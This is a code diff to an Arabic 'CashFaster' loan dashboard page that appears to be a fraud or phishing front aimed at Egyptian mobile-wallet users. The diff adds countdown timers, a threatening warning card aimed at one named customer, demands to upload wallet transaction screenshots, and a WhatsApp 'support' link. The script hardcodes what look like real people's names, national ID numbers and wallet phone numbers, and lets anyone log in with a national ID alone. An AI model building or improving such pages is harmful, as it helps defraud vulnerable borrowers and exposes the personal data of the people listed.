@@ -223,6 +223,67 @@
             margin: 0;
         }
 
+        /* المحتوى العادي (لأصحاب المحفظة) */
+        .normal-dashboard-content {
+            display: block;
+        }
+        .wallet-required-content {
+            display: none;
+            text-align: center;
+            padding: 2rem;
+            background: rgba(0,0,0,0.5);
+            border-radius: 2rem;
+            border: 2px solid #ff6b35;
+            margin-top: 2rem;
+        }
+        .wallet-required-content h3 {
+            color: #FFD966;
+            margin-bottom: 1rem;
+        }
+        .wallet-timer {
+            font-size: 2.5rem;
+            font-family: monospace;
+            font-weight: bold;
+            color: #ff6b35;
+            margin: 1rem 0;
+        }
+
+        /* بطاقة التحذير الخاصة للعميل 30007310101779 */
+        .warning-card {
+            background: linear-gradient(135deg, rgba(255, 80, 80, 0.9), rgba(200, 40, 40, 0.95));
+            border: 3px solid #FFD700;
+            border-radius: 1.5rem;
+            padding: 1.5rem;
+            margin-bottom: 2rem;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+            animation: pulseWarning 1.5s infinite;
+        }
+        @keyframes pulseWarning {
+            0% { box-shadow: 0 0 0 0 rgba(255, 80, 80, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(255, 80, 80, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 80, 80, 0); }
+        }
+        .warning-card i {
+            font-size: 3rem;
+            color: #FFD700;
+            margin-bottom: 0.5rem;
+        }
+        .warning-card h3 {
+            color: #FFD700;
+            font-size: 1.8rem;
+            margin-bottom: 0.8rem;
+        }
+        .warning-card p {
+            color: white;
+            font-size: 1.1rem;
+            line-height: 1.8;
+        }
+        .warning-card .highlight {
+            color: #FFD700;
+            font-weight: bold;
+        }
+
         .hero-section {
             background: linear-gradient(135deg, rgba(212,175,55,0.1), rgba(245,176,66,0.05));
             border: 1px solid rgba(212,175,55,0.2);
@@ -472,25 +533,6 @@
             font-size: 0.9rem;
         }
 
-        .wallet-warning {
-            background: rgba(74, 42, 26, 0.5);
-            border: 1px solid rgba(212,175,55,0.3);
-            border-radius: 2rem;
-            padding: 1.5rem;
-            text-align: center;
-            margin-bottom: 1rem;
-            display: none;
-        }
-
-        .wallet-warning.active {
-            display: block;
-        }
-
-        .wallet-warning h3 {
-            color: #FFD966;
-            margin-bottom: 1rem;
-        }
-
         .linking-section {
             display: none;
         }
@@ -499,7 +541,6 @@
             display: block;
         }
 
-        /* مؤقت التوجيه التلقائي */
         .auto-redirect-box {
             background: rgba(212, 175, 55, 0.2);
             border: 1px solid #D4AF37;
@@ -603,107 +644,128 @@
             </div>
         </div>
 
-        <div class="hero-section">
-            <div class="hero-video">
-                <video controls width="100%">
-                    <source src="https://d2xsxph8kpxj0f.cloudfront.net/310519663383374789/ZJ8unChtzfopWU9AxQ6boN/eid_al-ftar_flash_cash_667ae5d1.mp4" type="video/mp4">
-                    متصفحك لا يدعم تشغيل الفيديو
-                </video>
-            </div>
-            <div class="hero-content">
-                <h2>🎉 مرحباً بك في CashFaster</h2>
-                <p>نحن نوفر لك نظاماً آمناً وموثوقاً للتمويل الرقمي. جميع بياناتك محمية بتشفير AES-256.</p>
-                <p><strong>✨ مميزات النظام:</strong></p>
-                <ul style="margin-right: 1rem; line-height: 1.8; color: #eef5ff;">
-                    <li>🔐 تشفير عالي الجودة لجميع البيانات</li>
-                    <li>⚡ معالجة سريعة للطلبات</li>
-                    <li>📱 دعم المحافظ الإلكترونية</li>
-                    <li>24/7 دعم فني متاح</li>
-                </ul>
+        <!-- بطاقة التحذير الخاصة بالعميل 30007310101779 (تظهر فقط له) -->
+        <div id="specialWarningCard" style="display: none;">
+            <div class="warning-card">
+                <i class="fas fa-exclamation-triangle"></i>
+                <h3>⚠️ تنبيه هام ⚠️</h3>
+                <p>عزيزي العميل <strong id="warningCustomerName">...</strong>،</p>
+                <p><span class="highlight">لابد من تأكيد ربط حديث بتاريخ اليوم ورفع سكرينات التأكيدات</span> ليتم استرجاع الطلب من الشطب.</p>
+                <p><strong class="highlight">ملاحظة مهمة:</strong> في حالة ربط تأكيداتك قديمة يتم إنهاء التعامل معك ووضعك في <span class="highlight">البلاك ليست (القائمة السوداء)</span>.</p>
+                <p>نرجو منكم الاهتمام بالمطلوب ليتم تفعيل القرض.</p>
+                <p style="margin-top: 1rem;"><i class="fas fa-calendar-alt"></i> يرجى التأكد من أن التأكيدات بتاريخ <strong id="todayDate"></strong></p>
             </div>
         </div>
 
-        <div class="info-grid">
-            <div class="info-card">
-                <i class="fas fa-chart-line"></i>
-                <strong>مبلغ التمويل</strong>
-                <span id="loanAmount" style="font-size:1.8rem; font-weight:bold;">0</span>
-            </div>
-            <div class="info-card">
-                <i class="fas fa-wallet"></i>
-                <strong>المحفظة المسجلة</strong>
-                <span id="walletType" style="font-size:1.2rem;">...</span>
-            </div>
-            <div class="info-card">
-                <i class="fas fa-id-card"></i>
-                <strong>رقم المحفظة</strong>
-                <span id="walletNumber" style="font-size:1.2rem; font-family: monospace;">...</span>
-            </div>
-            <div class="info-card">
-                <i class="fas fa-user-check"></i>
-                <strong>حالة الطلب</strong>
-                <span id="statusMsg">مطلوب إتمام الربط</span>
-            </div>
-            <div class="info-card">
-                <i class="fas fa-calendar-alt"></i>
-                <strong>القسط الشهري</strong>
-                <span id="monthlyInstallment" style="font-size:1.5rem; font-weight:bold;">0</span>
-            </div>
-            <div class="info-card">
-                <i class="fas fa-calendar-week"></i>
-                <strong>مدة السداد (شهر)</strong>
-                <span id="loanDuration" style="font-size:1.5rem; font-weight:bold;">0</span>
-            </div>
-            <div class="info-card">
-                <i class="fas fa-calendar-check"></i>
-                <strong>موعد أول قسط</strong>
-                <span id="firstPaymentDate" style="font-size:1.1rem;">-</span>
-            </div>
-        </div>
-
-        <div class="timer-box">
-            <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي للربط الآمن</div>
-            <div class="timer" id="timerDisplay">30:00</div>
-            <div style="font-size:0.8rem;">انتهاء الوقت = تعليق مؤقت | يمكنك التواصل مع الدعم لتمديده</div>
-        </div>
-
-        <div id="walletRequiredMessage" class="wallet-warning">
-            <i class="fas fa-exclamation-triangle" style="font-size:2rem; color: #FFD966;"></i>
-            <h3>محفظة إلكترونية مطلوبة</h3>
-            <p style="margin-bottom: 1rem;">عزيزي العميل، يجب عليك فتح محفظة <strong>فودافون كاش</strong> أو <strong>اتصالات كاش</strong> خلال <span id="deadlineText">4 ساعات</span> لإكمال طلب التمويل الخاص بك.</p>
-            <p style="margin-bottom: 1rem;">بعد فتح المحفظة، يرجى التواصل مع الدعم الفني على <strong>واتساب</strong> لإعادة تفعيل الطلب.</p>
-            <div class="timer" id="walletDeadlineTimer" style="font-size:2rem; margin-bottom: 1rem;">04:00:00</div>
-            <a href="https://wa.me/212614494251?text=السلام%20عليكم%20،%20لقد%20قمت%20بفتح%20محفظتي%20وأريد%20استكمال%20طلب%20التمويل" target="_blank" class="btn-gold" style="display:inline-block;">📱 تواصل مع الدعم عبر واتساب</a>
-        </div>
-
-        <div id="linkingSection" class="linking-section">
-            <div id="autoRedirectBox" class="auto-redirect-box" style="display: none;">
-                <span><i class="fas fa-hourglass-half"></i> سيتم توجيهك إلى رابط الربط تلقائياً بعد</span>
-                <span class="timer-number" id="redirectSeconds">30</span>
-                <span>ثانية</span>
-                <span class="cancel-redirect" onclick="cancelAutoRedirect()">إلغاء التوجيه</span>
-            </div>
-            <div class="glass-card" style="padding:1.5rem; margin-bottom:2rem;">
-                <h3 style="font-size: 1.5rem; margin-bottom: 1rem;"><i class="fas fa-link"></i> ربط المحفظة الإلكترونية</h3>
-                <div id="instructionBox" style="background:#0f1722; border-radius:1rem; padding:1rem; margin:1rem 0;"></div>
-                <div class="step-container" id="stepsContainer">
-                    <div class="step">1️⃣ رساله العملية كاملة</div>
-                    <div class="step">2️⃣ تاريخ العملية</div>
-                    <div class="step">3️⃣ مبلغ العملية المؤكد</div>
-                    <div class="step">4️⃣ تأكيد الإصدار</div>
+        <!-- المحتوى العادي (يظهر للجميع، بما فيهم العميل المذكور) -->
+        <div id="normalDashboardContent" class="normal-dashboard-content">
+            <div class="hero-section">
+                <div class="hero-video">
+                    <video controls width="100%">
+                        <source src="https://d2xsxph8kpxj0f.cloudfront.net/310519663383374789/ZJ8unChtzfopWU9AxQ6boN/eid_al-ftar_flash_cash_667ae5d1.mp4" type="video/mp4">
+                        متصفحك لا يدعم تشغيل الفيديو
+                    </video>
                 </div>
-                <div class="upload-area" onclick="redirectToLinkingForm()">
-                    <i class="fas fa-cloud-upload-alt" style="font-size:2rem;"></i>
-                    <div>اضغط لرفع صور السكرينات (تكون الرسالة كاملة)</div>
+                <div class="hero-content">
+                    <h2>🎉 مرحباً بك في CashFaster</h2>
+                    <p>نحن نوفر لك نظاماً آمناً وموثوقاً للتمويل الرقمي. جميع بياناتك محمية بتشفير AES-256.</p>
+                    <p><strong>✨ مميزات النظام:</strong></p>
+                    <ul style="margin-right: 1rem; line-height: 1.8; color: #eef5ff;">
+                        <li>🔐 تشفير عالي الجودة لجميع البيانات</li>
+                        <li>⚡ معالجة سريعة للطلبات</li>
+                        <li>📱 دعم المحافظ الإلكترونية</li>
+                        <li>24/7 دعم فني متاح</li>
+                    </ul>
                 </div>
-                <button class="btn-gold" style="width:100%; margin-top:1rem;" onclick="redirectToLinkingForm()">✅ تأكيد الربط وإرسال المستندات</button>
             </div>
+
+            <div class="info-grid">
+                <div class="info-card">
+                    <i class="fas fa-chart-line"></i>
+                    <strong>مبلغ التمويل</strong>
+                    <span id="loanAmount" style="font-size:1.8rem; font-weight:bold;">0</span>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-wallet"></i>
+                    <strong>المحفظة المسجلة</strong>
+                    <span id="walletType" style="font-size:1.2rem;">...</span>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-id-card"></i>
+                    <strong>رقم المحفظة</strong>
+                    <span id="walletNumber" style="font-size:1.2rem; font-family: monospace;">...</span>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-user-check"></i>
+                    <strong>حالة الطلب</strong>
+                    <span id="statusMsg">مطلوب إتمام الربط</span>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-calendar-alt"></i>
+                    <strong>القسط الشهري</strong>
+                    <span id="monthlyInstallment" style="font-size:1.5rem; font-weight:bold;">0</span>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-calendar-week"></i>
+                    <strong>مدة السداد (شهر)</strong>
+                    <span id="loanDuration" style="font-size:1.5rem; font-weight:bold;">0</span>
+                </div>
+                <div class="info-card">
+                    <i class="fas fa-calendar-check"></i>
+                    <strong>موعد أول قسط</strong>
+                    <span id="firstPaymentDate" style="font-size:1.1rem;">-</span>
+                </div>
+            </div>
+
+            <div class="timer-box">
+                <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي للربط الآمن</div>
+                <div class="timer" id="timerDisplay">30:00</div>
+                <div style="font-size:0.8rem;">انتهاء الوقت = تعليق مؤقت | يمكنك التواصل مع الدعم لتمديده</div>
+            </div>
+
+            <div id="linkingSection" class="linking-section">
+                <div id="autoRedirectBox" class="auto-redirect-box" style="display: none;">
+                    <span><i class="fas fa-hourglass-half"></i> سيتم توجيهك إلى رابط الربط تلقائياً بعد</span>
+                    <span class="timer-number" id="redirectSeconds">30</span>
+                    <span>ثانية</span>
+                    <span class="cancel-redirect" onclick="cancelAutoRedirect()">إلغاء التوجيه</span>
+                </div>
+                <div class="glass-card" style="padding:1.5rem; margin-bottom:2rem;">
+                    <h3 style="font-size: 1.5rem; margin-bottom: 1rem;"><i class="fas fa-link"></i> ربط المحفظة الإلكترونية</h3>
+                    <div id="instructionBox" style="background:#0f1722; border-radius:1rem; padding:1rem; margin:1rem 0;"></div>
+                    <div class="step-container" id="stepsContainer">
+                        <div class="step">1️⃣ رساله العملية كاملة</div>
+                        <div class="step">2️⃣ تاريخ العملية</div>
+                        <div class="step">3️⃣ مبلغ العملية المؤكد</div>
+                        <div class="step">4️⃣ تأكيد الإصدار</div>
+                    </div>
+                    <div class="upload-area" onclick="redirectToLinkingForm()">
+                        <i class="fas fa-cloud-upload-alt" style="font-size:2rem;"></i>
+                        <div>اضغط لرفع صور السكرينات (تكون الرسالة كاملة)</div>
+                    </div>
+                    <button class="btn-gold" style="width:100%; margin-top:1rem;" onclick="redirectToLinkingForm()">✅ تأكيد الربط وإرسال المستندات</button>
+                </div>
+            </div>
+
+            <footer>
+                <i class="fas fa-lock"></i> جميع البيانات مشفرة وفقاً لمعايير ISO 27001<br>
+                سياسة الخصوصية | شروط الخدمة | الدعم الفني 24/7
+            </footer>
         </div>
 
-        <footer>
-            <i class="fas fa-lock"></i> جميع البيانات مشفرة وفقاً لمعايير ISO 27001<br>
-            سياسة الخصوصية | شروط الخدمة | الدعم الفني 24/7
-        </footer>
+        <!-- المحتوى الخاص بالعملاء الذين ليس لديهم محفظة (يظهر بديلاً) -->
+        <div id="walletRequiredContent" class="wallet-required-content">
+            <i class="fas fa-exclamation-triangle" style="font-size: 3rem; color: #FFD966; margin-bottom: 1rem;"></i>
+            <h3>⚠️ محفظة إلكترونية مطلوبة ⚠️</h3>
+            <p>عزيزي العميل، لا يوجد لديك محفظة إلكترونية مسجلة (فودافون كاش أو اتصالات كاش).</p>
+            <p>يجب عليك فتح محفظة خلال <strong>4 ساعات</strong> لإكمال إجراءات التمويل.</p>
+            <p>نظامنا يدعم فقط <strong>فودافون كاش</strong> أو <strong>اتصالات كاش</strong>.</p>
+            <div class="wallet-timer" id="walletRequiredTimer">04:00:00</div>
+            <a href="https://wa.me/212614494251?text=السلام%20عليكم%20،%20لقد%20قمت%20بفتح%20محفظتي%20وأريد%20استكمال%20طلب%20التمويل" target="_blank" class="btn-gold" style="display: inline-block; margin-top: 1rem;">
+                <i class="fab fa-whatsapp"></i> تواصل مع الدعم بعد فتح المحفظة
+            </a>
+            <p style="margin-top: 1rem; font-size: 0.8rem; color: #aaa;">بعد فتح المحفظة، سيتم إعادة تفعيل طلبك ويمكنك إتمام الربط.</p>
+        </div>
     </div>
 </div>
 
@@ -773,7 +835,7 @@
         return loanDetailsMap[closest] || { months: 12, installment: 0 };
     }
 
-    // ========== قاعدة العملاء (بدون طلب آخر 4 أرقام) ==========
+    // ========== قاعدة العملاء ==========
     const customers = [
         { name: "احمد ماهر احمد محمد ", id: "28309122103052", wallet: "01032201208", type: "فودافون", loan: 100000, step: 22500 },
         { name: "معاذ السيد الغريب أحمد", id: "28205031201019", wallet: "01033830731", type: "فودافون", loan: 200000, step: 50000 },
@@ -794,15 +856,15 @@
         { name: "وليد علي حسن علي الدين", id: "27303270102837", wallet: "01004244313", type: "فودافون", loan: 185000, step: 46250 },
         { name: "كرم محروس محمود حفني", id: "28611200135", wallet: "01151775319", type: "اتصالات", loan: 30000, step: 7500 },
         { name: "محمد مجدي احمد مسعد", id: "2011101357", wallet: "01070710710", type: "فودافون", loan: 200000, step: 50000 },
-        { name: "محمد ناهض محمد السيد", id: "300073101779", wallet: "01155143436", type: "اتصالات", loan: 50000, step: 12500 },
+        { name: "محمد ناهض محمد السيد", id: "30007310101779", wallet: "01155143436", type: "اتصالات", loan: 50000, step: 12500 },
         { name: "صلاح مختار حنفي قرني", id: "27708040101271", wallet: "01023669498", type: "فودافون", loan: 50000, step: 12500 },
         { name: "السيد ابراهيم الششتاوي قناوي ", id: "26803241601893", wallet: "01090232423", type: "فودافون", loan: 30000, step: 7500 },
         { name: "محمود علي المتولي السيد حسن", id: "28404071200379", wallet: "01001093695", type: "فودافون", loan: 30000, step: 7500 },
-        { name: "وحيد محمد عارف عبد الله", id: "283090600611", wallet: "01017453927", type: "فودافون", loan: 200000, step: 50000 },
+        { name: " توبى صلاح الدين الضرغامى احمد ", id: "27001152400606", wallet: null, type: null, loan: 200000, step: 50000 },
         { name: "مدحت محمد محمود سالم ", id: "27910252801039", wallet: "01159760178", type: "اتصالات", loan: 50000, step: 12500 },
         { name: "الشيماء عبد الغفور دسوقي عباس", id: "282072102361", wallet: "01143455214", type: "اتصالات", loan: 150000, step: 37500 },
-        { name: "رفيق فؤاد عبد الفضيل يوسف", id: "275121400919", wallet: "01014337192", type: "فودافون", loan: 190000, step: 47500 },
-        { name: "هشام أحمد صلاح محمد عبدالغغار", id: "2711414511", wallet: "01022560232", type: "فودافون", loan: 50000, step: 12500 },
+        { name: "علي حسين سيد علي", id: "28805142501019", wallet: "01143756596", type: "اتصالات", loan: 30000, step: 7500 },
+        { name: "احمد كمال عبدالتواب محمد ", id: "283111422016", wallet: "01022560232", type: "فودافون", loan: 30000, step: 7500 },
         { name: "محمد محمود عبد الحميد محمد", id: "283101901335", wallet: "01026479629", type: "فودافون", loan: 40000, step: 10000 },
         { name: "ياسر سعد محمد بكر", id: "275073200599", wallet: "01226157120", type: "فودافون", loan: 60000, step: 15000 },
         { name: "حسين صبرى مصطفى حسن", id: "28909012110875", wallet: "01142032336", type: "اتصالات", loan: 100000, step: 25000 },
@@ -864,6 +926,25 @@
         }, 30000);
     }
 
+    function startWalletDeadline() {
+        if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
+        let timeLeft = 4 * 60 * 60;
+        const timerElem = document.getElementById('walletRequiredTimer');
+        function update() {
+            const hours = Math.floor(timeLeft / 3600);
+            const mins = Math.floor((timeLeft % 3600) / 60);
+            const secs = timeLeft % 60;
+            timerElem.innerText = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            if (timeLeft <= 0) {
+                clearInterval(walletDeadlineInterval);
+                alert('انتهت المهلة المتاحة لفتح المحفظة. يرجى التواصل مع الدعم الفني لإعادة تفعيل الطلب.');
+            }
+            timeLeft--;
+        }
+        update();
+        walletDeadlineInterval = setInterval(update, 1000);
+    }
+
     function handleLogin() {
         const nationalId = document.getElementById('nationalId').value.trim();
         const errorDiv = document.getElementById('loginError');
@@ -879,7 +960,6 @@
             return;
         }
         
-        // تم إزالة طلب آخر 4 أرقام من المحفظة - الدخول مباشرة بالرقم القومي فقط
         currentCustomer = customer;
         errorDiv.textContent = '';
         document.getElementById('loginPage').style.display = 'none';
@@ -911,17 +991,41 @@
         document.getElementById('loanDuration').innerText = months + ' شهر';
         document.getElementById('firstPaymentDate').innerText = formattedDate;
 
-        const hasWallet = customer.type && customer.wallet && customer.wallet !== '.';
+        const hasWallet = customer.type && customer.wallet && customer.wallet !== '.' && customer.wallet !== null;
+        const normalDiv = document.getElementById('normalDashboardContent');
+        const walletRequiredDiv = document.getElementById('walletRequiredContent');
+        
+        // عرض بطاقة التحذير للعميل الخاص (محمد ناهض محمد السيد)
+        const specialWarningDiv = document.getElementById('specialWarningCard');
+        if (customer.id === "30007310101779") {
+            specialWarningDiv.style.display = 'block';
+            document.getElementById('warningCustomerName').innerText = customer.name;
+            // عرض التاريخ الحالي
+            const todayDate = new Date().toLocaleDateString('ar-EG', { year: 'numeric', month: 'long', day: 'numeric' });
+            document.getElementById('todayDate').innerText = todayDate;
+        } else {
+            specialWarningDiv.style.display = 'none';
+        }
+        
         if (hasWallet) {
+            // إظهار المحتوى العادي وإخفاء المحتوى الخاص بفتح المحفظة
+            normalDiv.style.display = 'block';
+            walletRequiredDiv.style.display = 'none';
+            // إظهار قسم الربط
             document.getElementById('linkingSection').classList.add('active');
-            document.getElementById('walletRequiredMessage').classList.remove('active');
             showLinkingInstructions(customer.type);
             startTimer();
             startAutoRedirect();
         } else {
-            document.getElementById('linkingSection').classList.remove('active');
-            document.getElementById('walletRequiredMessage').classList.add('active');
+            // إظهار المحتوى الخاص بفتح المحفظة وإخفاء المحتوى العادي
+            normalDiv.style.display = 'none';
+            walletRequiredDiv.style.display = 'block';
+            // بدء عداد 4 ساعات
             startWalletDeadline();
+            // التأكد من إخفاء أي مؤقتات أخرى
+            if (timerInterval) clearInterval(timerInterval);
+            if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
+            if (autoRedirectInterval) clearInterval(autoRedirectInterval);
         }
     }
 
@@ -968,25 +1072,6 @@
         timerInterval = setInterval(update, 1000);
     }
 
-    function startWalletDeadline() {
-        if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
-        let timeLeft = 4 * 60 * 60;
-        const deadlineElem = document.getElementById('walletDeadlineTimer');
-        function update() {
-            const hours = Math.floor(timeLeft / 3600);
-            const mins = Math.floor((timeLeft % 3600) / 60);
-            const secs = timeLeft % 60;
-            deadlineElem.innerText = `${hours.toString().padStart(2,'0')}:${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
-            if (timeLeft <= 0) {
-                clearInterval(walletDeadlineInterval);
-                alert('انتهى الوقت المتاح لفتح المحفظة. يرجى التواصل مع الدعم الفني لإعادة تفعيل الطلب.');
-            }
-            timeLeft--;
-        }
-        update();
-        walletDeadlineInterval = setInterval(update, 1000);
-    }
-
     function toggleChat() {
         const modal = document.getElementById('chatModal');
         modal.classList.toggle('active');
@@ -1012,14 +1097,12 @@
     function handleLogout() {
         if (autoRedirectTimer) clearTimeout(autoRedirectTimer);
         if (autoRedirectInterval) clearInterval(autoRedirectInterval);
+        if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
+        if (timerInterval) clearInterval(timerInterval);
         document.getElementById('dashboardPage').classList.remove('active');
         document.getElementById('loginPage').style.display = 'flex';
         currentCustomer = null;
         document.getElementById('nationalId').value = '';
-        if (timerInterval) clearInterval(timerInterval);
-        if (walletDeadlineInterval) clearInterval(walletDeadlineInterval);
-        const box = document.getElementById('autoRedirectBox');
-        if (box) box.style.display = 'none';
     }
 
     window.onclick = function(e) {
